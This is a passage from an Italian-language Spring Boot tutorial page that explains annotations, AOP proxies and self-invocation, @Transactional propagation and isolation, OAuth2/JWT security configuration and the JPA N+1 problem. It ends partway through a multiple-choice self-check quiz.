    @Bean
    @ConditionalOnMissingBean(DataSource.class)  // Solo se nessun DataSource è già definito
    public DataSource defaultDataSource() {
        return new H2DataSource();
    }
}

// @Profile - Attiva bean solo per profili specifici
@Configuration
@Profile("dev")
public class DevConfig {
    @Bean
    public EmailService emailService() {
        return new MockEmailService();  // Non invia email vere in dev
    }
}

@Configuration
@Profile("prod")
public class ProdConfig {
    @Bean
    public EmailService emailService() {
        return new SmtpEmailService();
    }
}

// Attivare profili: --spring.profiles.active=dev,local</code></pre>

                <h3>Web Layer Annotations</h3>

                <pre><code class="language-java">@RestController
@RequestMapping("/api/v1/users")
public class UserController {

    // @GetMapping - HTTP GET
    @GetMapping("/{id}")
    public ResponseEntity&lt;User&gt; getUser(@PathVariable Long id) {
        return ResponseEntity.ok(userService.findById(id));
    }

    // @PostMapping - HTTP POST
    @PostMapping
    @ResponseStatus(HttpStatus.CREATED)
    public User createUser(@RequestBody @Valid CreateUserRequest request) {
        return userService.create(request);
    }

    // @PutMapping - HTTP PUT (replace)
    @PutMapping("/{id}")
    public User updateUser(@PathVariable Long id, @RequestBody UpdateUserRequest request) {
        return userService.update(id, request);
    }

    // @PatchMapping - HTTP PATCH (partial update)
    @PatchMapping("/{id}")
    public User patchUser(@PathVariable Long id, @RequestBody Map&lt;String, Object&gt; updates) {
        return userService.patch(id, updates);
    }

    // @DeleteMapping - HTTP DELETE
    @DeleteMapping("/{id}")
    @ResponseStatus(HttpStatus.NO_CONTENT)
    public void deleteUser(@PathVariable Long id) {
        userService.delete(id);
    }

    // Query parameters
    @GetMapping
    public Page&lt;User&gt; searchUsers(
            @RequestParam(required = false) String name,
            @RequestParam(defaultValue = "0") int page,
            @RequestParam(defaultValue = "20") int size) {
        return userService.search(name, PageRequest.of(page, size));
    }

    // Headers
    @GetMapping("/me")
    public User getCurrentUser(@RequestHeader("Authorization") String token) {
        return userService.fromToken(token);
    }
}</code></pre>

                <h3>Validation Annotations</h3>

                <pre><code class="language-java">public class CreateUserRequest {

    @NotNull(message = "Il nome è obbligatorio")
    @Size(min = 2, max = 50, message = "Il nome deve essere tra 2 e 50 caratteri")
    private String name;

    @NotBlank
    @Email(message = "Email non valida")
    private String email;

    @NotNull
    @Min(value = 18, message = "Devi avere almeno 18 anni")
    @Max(value = 120)
    private Integer age;

    @Pattern(regexp = "^\\+?[1-9]\\d{1,14}$", message = "Numero di telefono non valido")
    private String phone;

    @Valid  // Valida anche l'oggetto nested
    @NotNull
    private Address address;
}

public class Address {
    @NotBlank
    private String street;

    @NotBlank
    @Size(min = 5, max = 5, message = "CAP deve essere di 5 cifre")
    private String zipCode;
}

// Nel controller
@PostMapping
public User createUser(@RequestBody @Valid CreateUserRequest request) {
    // Se la validazione fallisce, viene lanciata MethodArgumentNotValidException
    return userService.create(request);
}

// Custom validator
@Target({ElementType.FIELD})
@Retention(RetentionPolicy.RUNTIME)
@Constraint(validatedBy = UniqueEmailValidator.class)
public @interface UniqueEmail {
    String message() default "Email già registrata";
    Class&lt;?&gt;[] groups() default {};
    Class&lt;? extends Payload&gt;[] payload() default {};
}

public class UniqueEmailValidator implements ConstraintValidator&lt;UniqueEmail, String&gt; {
    @Autowired
    private UserRepository userRepository;

    @Override
    public boolean isValid(String email, ConstraintValidatorContext context) {
        return !userRepository.existsByEmail(email);
    }
}</code></pre>

                <h3>JPA Annotations</h3>

                <pre><code class="language-java">@Entity
@Table(name = "users", indexes = {
    @Index(name = "idx_email", columnList = "email", unique = true)
})
public class User {

    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;

    @Column(nullable = false, length = 100)
    private String name;

    @Column(unique = true, nullable = false)
    private String email;

    @Enumerated(EnumType.STRING)  // Salva il nome dell'enum, non l'ordinale
    private UserStatus status;

    @Embedded
    private Address address;

    @OneToMany(mappedBy = "user", cascade = CascadeType.ALL, orphanRemoval = true)
    private List&lt;Order&gt; orders = new ArrayList&lt;&gt;();

    @ManyToMany
    @JoinTable(
        name = "user_roles",
        joinColumns = @JoinColumn(name = "user_id"),
        inverseJoinColumns = @JoinColumn(name = "role_id")
    )
    private Set&lt;Role&gt; roles = new HashSet&lt;&gt;();

    @CreatedDate
    @Column(updatable = false)
    private LocalDateTime createdAt;

    @LastModifiedDate
    private LocalDateTime updatedAt;

    @Version  // Optimistic locking
    private Long version;

    @Transient  // Non persistito nel DB
    private String temporaryToken;
}

@Embeddable
public class Address {
    private String street;
    private String city;
    private String zipCode;
}</code></pre>

                <h3>Caching Annotations</h3>

                <pre><code class="language-java">@Configuration
@EnableCaching
public class CacheConfig { }

@Service
public class ProductService {

    @Cacheable(value = "products", key = "#id")
    public Product findById(Long id) {
        // Chiamato solo se non in cache
        return productRepository.findById(id).orElseThrow();
    }

    @Cacheable(value = "products", key = "#root.method.name + #category")
    public List&lt;Product&gt; findByCategory(String category) {
        return productRepository.findByCategory(category);
    }

    @CachePut(value = "products", key = "#product.id")
    public Product update(Product product) {
        // Aggiorna sempre la cache con il risultato
        return productRepository.save(product);
    }

    @CacheEvict(value = "products", key = "#id")
    public void delete(Long id) {
        // Rimuove dalla cache
        productRepository.deleteById(id);
    }

    @CacheEvict(value = "products", allEntries = true)
    public void clearCache() {
        // Svuota tutta la cache "products"
    }

    @Caching(evict = {
        @CacheEvict(value = "products", key = "#product.id"),
        @CacheEvict(value = "categories", key = "#product.category")
    })
    public void updateWithCategoryChange(Product product) {
        productRepository.save(product);
    }
}</code></pre>

                <h3>Async & Scheduling Annotations</h3>

                <pre><code class="language-java">@Configuration
@EnableAsync
@EnableScheduling
public class AsyncConfig {

    @Bean
    public Executor taskExecutor() {
        ThreadPoolTaskExecutor executor = new ThreadPoolTaskExecutor();
        executor.setCorePoolSize(5);
        executor.setMaxPoolSize(10);
        executor.setQueueCapacity(25);
        executor.setThreadNamePrefix("Async-");
        return executor;
    }
}

@Service
public class NotificationService {

    @Async  // Eseguito in un thread separato
    public void sendEmailAsync(String to, String message) {
        // Non blocca il chiamante
        emailClient.send(to, message);
    }

    @Async
    public CompletableFuture&lt;Report&gt; generateReportAsync(Long userId) {
        Report report = reportGenerator.generate(userId);
        return CompletableFuture.completedFuture(report);
    }
}

@Component
public class ScheduledTasks {

    @Scheduled(fixedRate = 60000)  // Ogni 60 secondi
    public void checkHealth() {
        healthChecker.check();
    }

    @Scheduled(fixedDelay = 30000)  // 30 sec dopo la fine dell'esecuzione precedente
    public void processQueue() {
        queueProcessor.process();
    }

    @Scheduled(cron = "0 0 2 * * ?")  // Ogni giorno alle 2:00 AM
    public void nightlyCleanup() {
        cleanupService.run();
    }

    @Scheduled(cron = "0 */15 9-17 * * MON-FRI")  // Ogni 15 min, 9-17, Lun-Ven
    public void businessHoursTask() {
        // ...
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>Attenzione con @Async</h4>
                    <p>Come <code>@Transactional</code>, anche <code>@Async</code> usa i proxy. La self-invocation non funziona! Inoltre, le eccezioni nei metodi async non vengono propagate al chiamante - usa un <code>AsyncUncaughtExceptionHandler</code> per gestirle.</p>
                </div>
            </section>

            <!-- Proxy Pattern Section -->
            <section class="section" id="modulo1-proxy">
                <h2>Proxy Pattern in Spring</h2>

                <p>Il <strong>Proxy Pattern</strong> è il meccanismo fondamentale attraverso cui Spring implementa l'<strong>Aspect-Oriented Programming</strong> (AOP). Quando annoti un bean con <code>@Transactional</code>, <code>@Cacheable</code>, <code>@Async</code>, o qualsiasi altro aspetto, Spring non usa direttamente la tua classe, ma crea un <em>proxy</em> che la avvolge.</p>

                <h3>JDK Dynamic Proxy vs CGLIB</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Caratteristica</th>
                            <th>JDK Dynamic Proxy</th>
                            <th>CGLIB Proxy</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Requisito</td>
                            <td>La classe deve implementare un'interfaccia</td>
                            <td>Nessun requisito (estende la classe)</td>
                        </tr>
                        <tr>
                            <td>Meccanismo</td>
                            <td>Implementa l'interfaccia a runtime</td>
                            <td>Crea una sottoclasse a runtime</td>
                        </tr>
                        <tr>
                            <td>Performance</td>
                            <td>Leggermente più veloce nella creazione</td>
                            <td>Leggermente più veloce nell'invocazione</td>
                        </tr>
                        <tr>
                            <td>Limitazioni</td>
                            <td>Solo metodi dell'interfaccia</td>
                            <td>No classi/metodi <code>final</code></td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box">
                    <h4>Spring Boot Default</h4>
                    <p>A partire da Spring Boot 2.0, il default è <code>proxyTargetClass=true</code>, quindi viene usato CGLIB anche quando la classe implementa un'interfaccia. Questo evita sorprese quando si fa cast della classe concreta.</p>
                </div>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────┐
│                    PROXY PATTERN IN SPRING                              │
├─────────────────────────────────────────────────────────────────────────┤
│                                                                         │
│   Client Code                                                           │
│       │                                                                 │
│       │ orderService.placeOrder()                                       │
│       ▼                                                                 │
│   ┌─────────────────────────────────────────────────┐                   │
│   │              PROXY (CGLIB/JDK)                  │                   │
│   │  ┌───────────────────────────────────────────┐  │                   │
│   │  │  1. Before Advice                         │  │                   │
│   │  │     - Apri transazione                    │  │                   │
│   │  │     - Log                                 │  │                   │
│   │  │     - Security check                      │  │                   │
│   │  └───────────────────────────────────────────┘  │                   │
│   │                      │                          │                   │
│   │                      ▼                          │                   │
│   │  ┌───────────────────────────────────────────┐  │                   │
│   │  │  2. Target Method Invocation              │  │                   │
│   │  │     orderService.placeOrder() [REAL]      │  │                   │
│   │  └───────────────────────────────────────────┘  │                   │
│   │                      │                          │                   │
│   │                      ▼                          │                   │
│   │  ┌───────────────────────────────────────────┐  │                   │
│   │  │  3. After Advice                          │  │                   │
│   │  │     - Commit/Rollback transazione         │  │                   │
│   │  │     - Log risultato                       │  │                   │
│   │  └───────────────────────────────────────────┘  │                   │
│   └─────────────────────────────────────────────────┘                   │
│                                                                         │
└─────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Il problema della Self-Invocation</h3>

                <p>Uno degli errori più comuni e insidiosi in Spring è la <strong>self-invocation</strong>: quando un metodo di un bean chiama un altro metodo dello stesso bean, il proxy viene bypassato.</p>

                <pre><code class="language-java">@Service
public class OrderService {

    @Transactional
    public void placeOrder(Order order) {
        // Logica di business
        validateOrder(order);  // ⚠️ SELF-INVOCATION!
        orderRepository.save(order);
    }

    @Transactional(propagation = Propagation.REQUIRES_NEW)
    public void validateOrder(Order order) {
        // Questa transazione NON verrà creata!
        // Il metodo viene chiamato direttamente, senza passare dal proxy
        auditRepository.save(new AuditLog(order));
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>Perché accade?</h4>
                    <p>Quando chiami <code>this.validateOrder()</code> (anche implicitamente), stai chiamando il metodo sulla <em>classe reale</em>, non sul proxy. Il proxy non ha modo di intercettare chiamate interne.</p>
                </div>

                <h3>Soluzioni alla Self-Invocation</h3>

                <pre><code class="language-java">// Soluzione 1: Estrarre in un altro service
@Service
@RequiredArgsConstructor
public class OrderService {
    private final OrderValidationService validationService;

    @Transactional
    public void placeOrder(Order order) {
        validationService.validateOrder(order);  // ✅ Passa attraverso il proxy
        orderRepository.save(order);
    }
}

// Soluzione 2: Self-injection (meno elegante, ma funziona)
@Service
public class OrderService {
    @Autowired
    private OrderService self;  // Inietta il proxy di se stesso

    @Transactional
    public void placeOrder(Order order) {
        self.validateOrder(order);  // ✅ Passa attraverso il proxy
        orderRepository.save(order);
    }
}

// Soluzione 3: ApplicationContext (più verbosa)
@Service
public class OrderService implements ApplicationContextAware {
    private ApplicationContext context;

    @Override
    public void setApplicationContext(ApplicationContext ctx) {
        this.context = ctx;
    }

    @Transactional
    public void placeOrder(Order order) {
        context.getBean(OrderService.class).validateOrder(order);
    }
}</code></pre>
            </section>

            <!-- Transactional Section -->
            <section class="section" id="modulo1-transactional">
                <h2>Gestione delle Transazioni con @Transactional</h2>

                <p>La gestione dichiarativa delle transazioni è una delle feature più potenti di Spring. L'annotazione <code>@Transactional</code> permette di definire i confini transazionali in modo elegante, ma nasconde complessità che è fondamentale comprendere.</p>

                <h3>Attributi chiave di @Transactional</h3>

                <table>
                    <thead>
                        <tr>
                            <th>Attributo</th>
                            <th>Default</th>
                            <th>Descrizione</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>propagation</code></td>
                            <td><code>REQUIRED</code></td>
                            <td>Come la transazione si propaga</td>
                        </tr>
                        <tr>
                            <td><code>isolation</code></td>
                            <td><code>DEFAULT</code></td>
                            <td>Livello di isolamento (dal DB)</td>
                        </tr>
                        <tr>
                            <td><code>readOnly</code></td>
                            <td><code>false</code></td>
                            <td>Ottimizzazione per query read-only</td>
                        </tr>
                        <tr>
                            <td><code>timeout</code></td>
                            <td><code>-1</code></td>
                            <td>Timeout in secondi</td>
                        </tr>
                        <tr>
                            <td><code>rollbackFor</code></td>
                            <td>RuntimeException</td>
                            <td>Eccezioni che causano rollback</td>
                        </tr>
                    </tbody>
                </table>

                <h3>Propagation Levels</h3>

                <pre><code class="language-java">// REQUIRED (default): usa la transazione esistente o ne crea una nuova
@Transactional(propagation = Propagation.REQUIRED)
public void methodA() {
    // Se c'è una transazione attiva, la usa
    // Altrimenti ne crea una nuova
}

// REQUIRES_NEW: sospende la transazione corrente e ne crea una nuova
@Transactional(propagation = Propagation.REQUIRES_NEW)
public void auditLog() {
    // Crea SEMPRE una nuova transazione
    // Se methodA() fa rollback, questo commit rimane
    auditRepository.save(log);
}

// NESTED: crea un savepoint nella transazione corrente
@Transactional(propagation = Propagation.NESTED)
public void nestedOperation() {
    // Se fallisce, rollback solo fino al savepoint
    // La transazione padre può decidere se continuare
}

// MANDATORY: DEVE esistere una transazione, altrimenti exception
@Transactional(propagation = Propagation.MANDATORY)
public void mustBeInTransaction() {
    // Lancia IllegalTransactionStateException se non c'è transazione
}

// NEVER: NON deve esistere una transazione
@Transactional(propagation = Propagation.NEVER)
public void mustNotBeInTransaction() {
    // Lancia exception se c'è una transazione attiva
}</code></pre>

                <div class="info-box warning">
                    <h4>Errore comune: Rollback su Checked Exception</h4>
                    <p>Per default, Spring fa rollback <strong>solo su RuntimeException</strong> e <code>Error</code>. Le checked exception (es: <code>IOException</code>) <strong>NON</strong> causano rollback automatico!</p>
                </div>

                <pre><code class="language-java">// ❌ Questa eccezione NON causa rollback!
@Transactional
public void processFile() throws IOException {
    orderRepository.save(order);
    throw new IOException("File not found");  // La transazione fa COMMIT!
}

// ✅ Soluzione: specificare rollbackFor
@Transactional(rollbackFor = Exception.class)
public void processFile() throws IOException {
    orderRepository.save(order);
    throw new IOException("File not found");  // Ora fa ROLLBACK
}</code></pre>

                <h3>Isolation Levels</h3>

                <p>I livelli di isolamento definiscono come le transazioni interagiscono tra loro e quali anomalie sono permesse:</p>

                <table>
                    <thead>
                        <tr>
                            <th>Isolation Level</th>
                            <th>Dirty Read</th>
                            <th>Non-Repeatable Read</th>
                            <th>Phantom Read</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>READ_UNCOMMITTED</code></td>
                            <td>Possibile</td>
                            <td>Possibile</td>
                            <td>Possibile</td>
                        </tr>
                        <tr>
                            <td><code>READ_COMMITTED</code></td>
                            <td>Prevenuto</td>
                            <td>Possibile</td>
                            <td>Possibile</td>
                        </tr>
                        <tr>
                            <td><code>REPEATABLE_READ</code></td>
                            <td>Prevenuto</td>
                            <td>Prevenuto</td>
                            <td>Possibile</td>
                        </tr>
                        <tr>
                            <td><code>SERIALIZABLE</code></td>
                            <td>Prevenuto</td>
                            <td>Prevenuto</td>
                            <td>Prevenuto</td>
                        </tr>
                    </tbody>
                </table>

                <div class="info-box">
                    <h4>Glossario</h4>
                    <ul>
                        <li><strong>Dirty Read:</strong> leggere dati non ancora committati da un'altra transazione</li>
                        <li><strong>Non-Repeatable Read:</strong> leggere lo stesso record due volte e ottenere valori diversi</li>
                        <li><strong>Phantom Read:</strong> una query restituisce righe diverse se eseguita due volte (insert/delete da altre tx)</li>
                    </ul>
                </div>
            </section>

            <!-- Spring Security Section -->
            <section class="section" id="modulo1-security">
                <h2>Spring Security: OAuth2 & JWT</h2>

                <p>Spring Security è il framework de-facto per la sicurezza nelle applicazioni Spring. Nel contesto moderno, la maggior parte delle architetture utilizza <strong>OAuth2</strong> per l'autorizzazione e <strong>JWT</strong> (JSON Web Tokens) come formato per i token.</p>

                <h3>OAuth2 Flows</h3>

                <div class="diagram">
                    <pre>
┌──────────────────────────────────────────────────────────────────────────────┐
│                    AUTHORIZATION CODE FLOW (più sicuro)                      │
├──────────────────────────────────────────────────────────────────────────────┤
│                                                                              │
│    ┌────────┐          ┌───────────────┐         ┌──────────────────┐        │
│    │ Client │          │ Authorization │         │ Resource Server  │        │
│    │ (App)  │          │    Server     │         │     (API)        │        │
│    └───┬────┘          └───────┬───────┘         └────────┬─────────┘        │
│        │                       │                          │                  │
│        │  1. Redirect to       │                          │                  │
│        │     /authorize        │                          │                  │
│        │─────────────────────▶│                          │                  │
│        │                       │                          │                  │
│        │  2. User logs in      │                          │                  │
│        │     & consents        │                          │                  │
│        │◀─────────────────────│                          │                  │
│        │                       │                          │                  │
│        │  3. Authorization     │                          │                  │
│        │     Code (via         │                          │                  │
│        │     redirect)         │                          │                  │
│        │◀─────────────────────│                          │                  │
│        │                       │                          │                  │
│        │  4. Exchange code     │                          │                  │
│        │     for tokens        │                          │                  │
│        │     (backend only)    │                          │                  │
│        │─────────────────────▶│                          │                  │
│        │                       │                          │                  │
│        │  5. Access Token      │                          │                  │
│        │     + Refresh Token   │                          │                  │
│        │◀─────────────────────│                          │                  │
│        │                       │                          │                  │
│        │  6. API Request                                  │                  │
│        │     with Bearer Token ─────────────────────────▶│                  │
│        │                                                  │                  │
│        │  7. Protected Resource ◀─────────────────────────│                  │
│        │                                                  │                  │
└──────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>JWT Structure</h3>

                <p>Un JWT è composto da tre parti separate da punti: <code>header.payload.signature</code></p>

                <pre><code class="language-json">// Header (Base64)
{
  "alg": "RS256",
  "typ": "JWT"
}

// Payload (Base64) - CLAIMS
{
  "sub": "1234567890",           // Subject (user ID)
  "name": "Mario Rossi",
  "email": "mario@example.com",
  "roles": ["ROLE_USER", "ROLE_ADMIN"],
  "iat": 1699900000,             // Issued At
  "exp": 1699903600,             // Expiration
  "iss": "https://auth.myapp.com" // Issuer
}

// Signature
RSASHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  privateKey
)</code></pre>

                <h3>Configurazione Spring Security con JWT</h3>

                <pre><code class="language-java">@Configuration
@EnableWebSecurity
public class SecurityConfig {

    @Bean
    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {
        return http
            .csrf(csrf -> csrf.disable())  // Disabilitato per API stateless
            .sessionManagement(session ->
                session.sessionCreationPolicy(SessionCreationPolicy.STATELESS))
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/**").authenticated()
            )
            .oauth2ResourceServer(oauth2 -> oauth2
                .jwt(jwt -> jwt
                    .jwtAuthenticationConverter(jwtAuthenticationConverter())
                )
            )
            .build();
    }

    @Bean
    public JwtAuthenticationConverter jwtAuthenticationConverter() {
        JwtGrantedAuthoritiesConverter authoritiesConverter =
            new JwtGrantedAuthoritiesConverter();
        authoritiesConverter.setAuthoritiesClaimName("roles");
        authoritiesConverter.setAuthorityPrefix("ROLE_");

        JwtAuthenticationConverter converter = new JwtAuthenticationConverter();
        converter.setJwtGrantedAuthoritiesConverter(authoritiesConverter);
        return converter;
    }
}</code></pre>

                <div class="info-box warning">
                    <h4>Security Best Practices</h4>
                    <ul>
                        <li>Usa <strong>RS256</strong> (asimmetrico) invece di HS256 per ambienti distribuiti</li>
                        <li>Mantieni i token di accesso con <strong>breve durata</strong> (15-30 min)</li>
                        <li>Usa <strong>Refresh Tokens</strong> con rotazione per sessioni lunghe</li>
                        <li><strong>Mai</strong> memorizzare dati sensibili nel payload JWT (è solo encoded, non encrypted)</li>
                        <li>Valida sempre <code>iss</code>, <code>aud</code>, <code>exp</code> claims</li>
                    </ul>
                </div>
            </section>

            <!-- JPA Section -->
            <section class="section" id="modulo1-jpa">
                <h2>Spring Data JPA & il Problema N+1</h2>

                <p>Il problema <strong>N+1</strong> è uno dei problemi di performance più comuni nelle applicazioni che usano un ORM. Si verifica quando il framework esegue una query per recuperare N entità, e poi N query aggiuntive per recuperare le relazioni di ciascuna.</p>

                <h3>Esempio del Problema N+1</h3>

                <pre><code class="language-java">@Entity
public class Order {
    @Id
    private Long id;

    @ManyToOne(fetch = FetchType.LAZY)
    private Customer customer;

    @OneToMany(mappedBy = "order", fetch = FetchType.LAZY)
    private List&lt;OrderItem&gt; items;
}

// Repository
public interface OrderRepository extends JpaRepository&lt;Order, Long&gt; {
    List&lt;Order&gt; findByStatus(OrderStatus status);
}

// Service - PROBLEMA N+1
@Service
public class OrderService {
    public List&lt;OrderDTO&gt; getActiveOrders() {
        List&lt;Order&gt; orders = orderRepository.findByStatus(ACTIVE);
        // Query 1: SELECT * FROM orders WHERE status = 'ACTIVE'

        return orders.stream()
            .map(order -> new OrderDTO(
                order.getId(),
                order.getCustomer().getName(),  // Query 2, 3, 4... N+1!
                order.getItems().size()          // Ancora N query!
            ))
            .toList();
    }
}</code></pre>

                <div class="diagram">
                    <pre>
┌─────────────────────────────────────────────────────────────────────────────┐
│                         PROBLEMA N+1 QUERIES                                │
├─────────────────────────────────────────────────────────────────────────────┤
│                                                                             │
│  Scenario: 100 ordini attivi, ognuno con customer e items                   │
│                                                                             │
│  Query 1:   SELECT * FROM orders WHERE status = 'ACTIVE'                    │
│                              │                                              │
│              ┌───────────────┼───────────────┐                              │
│              ▼               ▼               ▼                              │
│  Query 2:   SELECT * FROM customers WHERE id = 1                            │
│  Query 3:   SELECT * FROM customers WHERE id = 2                            │
│  ...                                                                        │
│  Query 101: SELECT * FROM customers WHERE id = 100                          │
│                              │                                              │
│              ┌───────────────┼───────────────┐                              │
│              ▼               ▼               ▼                              │
│  Query 102: SELECT * FROM order_items WHERE order_id = 1                    │
│  Query 103: SELECT * FROM order_items WHERE order_id = 2                    │
│  ...                                                                        │
│  Query 201: SELECT * FROM order_items WHERE order_id = 100                  │
│                                                                             │
│  TOTALE: 1 + 100 + 100 = 201 QUERY! (invece di 1-3 ottimali)                │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
                    </pre>
                </div>

                <h3>Soluzioni al Problema N+1</h3>

                <pre><code class="language-java">// Soluzione 1: JOIN FETCH (JPQL)
public interface OrderRepository extends JpaRepository&lt;Order, Long&gt; {

    @Query("""
        SELECT DISTINCT o FROM Order o
        LEFT JOIN FETCH o.customer
        LEFT JOIN FETCH o.items
        WHERE o.status = :status
        """)
    List&lt;Order&gt; findByStatusWithDetails(@Param("status") OrderStatus status);
}

// Soluzione 2: @EntityGraph (più dichiarativo)
public interface OrderRepository extends JpaRepository&lt;Order, Long&gt; {

    @EntityGraph(attributePaths = {"customer", "items"})
    List&lt;Order&gt; findByStatus(OrderStatus status);
}

// Soluzione 3: @BatchSize (per lazy loading ottimizzato)
@Entity
public class Order {
    @OneToMany(mappedBy = "order", fetch = FetchType.LAZY)
    @BatchSize(size = 25)  // Carica 25 collezioni alla volta
    private List&lt;OrderItem&gt; items;
}

// Soluzione 4: Projection (quando servono pochi campi)
public interface OrderSummary {
    Long getId();
    String getCustomerName();
    Integer getItemCount();
}

@Query("""
    SELECT o.id as id,
           c.name as customerName,
           SIZE(o.items) as itemCount
    FROM Order o
    JOIN o.customer c
    WHERE o.status = :status
    """)
List&lt;OrderSummary&gt; findOrderSummaries(@Param("status") OrderStatus status);</code></pre>

                <div class="info-box success">
                    <h4>Best Practice</h4>
                    <ul>
                        <li>Usa sempre <code>FetchType.LAZY</code> come default</li>
                        <li>Usa <code>JOIN FETCH</code> o <code>@EntityGraph</code> nelle query che necessitano delle relazioni</li>
                        <li>Attiva il logging delle query in sviluppo: <code>spring.jpa.show-sql=true</code></li>
                        <li>Usa strumenti come <strong>Hibernate Statistics</strong> o <strong>p6spy</strong> per monitorare</li>
                        <li>Considera <strong>Projections</strong> per DTOs read-only (migliore performance)</li>
                    </ul>
                </div>

                <div class="info-box warning">
                    <h4>Attenzione: MultipleBagFetchException</h4>
                    <p>Non puoi fare JOIN FETCH di due <code>List</code> contemporaneamente (Cartesian Product problem). Soluzioni:</p>
                    <ul>
                        <li>Cambia una delle collection in <code>Set</code></li>
                        <li>Usa due query separate con <code>@BatchSize</code></li>
                        <li>Usa <code>@Fetch(FetchMode.SUBSELECT)</code></li>
                    </ul>
                </div>
            </section>

            <!-- Quiz Section -->
            <section class="quiz-section" id="modulo1-quiz">
                <h2>Interactive Challenge Quiz</h2>
                <p style="color: var(--text-secondary); margin-bottom: 30px;">Metti alla prova la tua comprensione di Spring. Queste domande riflettono il livello di difficoltà dei colloqui nelle Big Tech.</p>

                <!-- Question 1 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q1.</span> Nel seguente codice, cosa succede quando viene chiamato <code>serviceA.methodA()</code>?</h4>
                    <pre><code class="language-java">@Service
public class ServiceA {
    @Transactional
    public void methodA() {
        // ... database operations ...
        methodB();
    }

    @Transactional(propagation = Propagation.REQUIRES_NEW)
    public void methodB() {
        // ... more database operations ...
        throw new RuntimeException("Error!");
    }
}</code></pre>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q1" id="q1a" value="a">
                            <label for="q1a">Solo methodB fa rollback, methodA fa commit (perché REQUIRES_NEW crea una nuova transazione)</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q1" id="q1b" value="b">
                            <label for="q1b">Entrambi i metodi fanno rollback perché l'eccezione si propaga</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q1" id="q1c" value="c">
                            <label for="q1c">Entrambi i metodi fanno rollback, ma NON perché REQUIRES_NEW funziona: il problema è la self-invocation</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q1" id="q1d" value="d">
                            <label for="q1d">L'applicazione non compila perché non si possono avere due @Transactional nello stesso service</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q1')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q1"></div>
                </div>

                <!-- Question 2 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q2.</span> Quale delle seguenti affermazioni sul JWT è <strong>FALSA</strong>?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q2" id="q2a" value="a">
                            <label for="q2a">Il payload del JWT è visibile a chiunque intercetti il token (è solo Base64 encoded)</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q2" id="q2b" value="b">
                            <label for="q2b">Un JWT con algoritmo RS256 può essere validato solo dal server che possiede la chiave privata</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q2" id="q2c" value="c">
                            <label for="q2c">Una volta emesso, un JWT non può essere revocato senza meccanismi aggiuntivi (come una blacklist)</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q2" id="q2d" value="d">
                            <label for="q2d">La signature del JWT garantisce che il payload non sia stato modificato dopo l'emissione</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q2')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q2"></div>
                </div>

                <!-- Question 3 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q3.</span> Quale combinazione di strategie risolve il problema N+1 per questa entity?</h4>
                    <pre><code class="language-java">@Entity
public class Department {
    @OneToMany(mappedBy = "department", fetch = FetchType.LAZY)
    private List&lt;Employee&gt; employees;

    @OneToMany(mappedBy = "department", fetch = FetchType.LAZY)
    private List&lt;Project&gt; projects;
}</code></pre>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q3" id="q3a" value="a">
                            <label for="q3a">Un singolo JOIN FETCH di entrambe le collection: <code>JOIN FETCH d.employees JOIN FETCH d.projects</code></label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q3" id="q3b" value="b">
                            <label for="q3b">Cambiare entrambe le collection in <code>FetchType.EAGER</code></label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q3" id="q3c" value="c">
                            <label for="q3c">Usare <code>@EntityGraph(attributePaths = {"employees", "projects"})</code></label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q3" id="q3d" value="d">
                            <label for="q3d">Cambiare una collection in Set, oppure usare due query separate con @BatchSize su entrambe</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q3')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q3"></div>
                </div>

                <!-- Question 4 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q4.</span> In quale fase del Bean Lifecycle vengono creati i proxy AOP?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q4" id="q4a" value="a">
                            <label for="q4a">Durante <code>postProcessAfterInitialization()</code> del BeanPostProcessor</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q4" id="q4b" value="b">
                            <label for="q4b">Durante l'instantiation del bean (fase 1)</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q4" id="q4c" value="c">
                            <label for="q4c">Durante <code>@PostConstruct</code></label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q4" id="q4d" value="d">
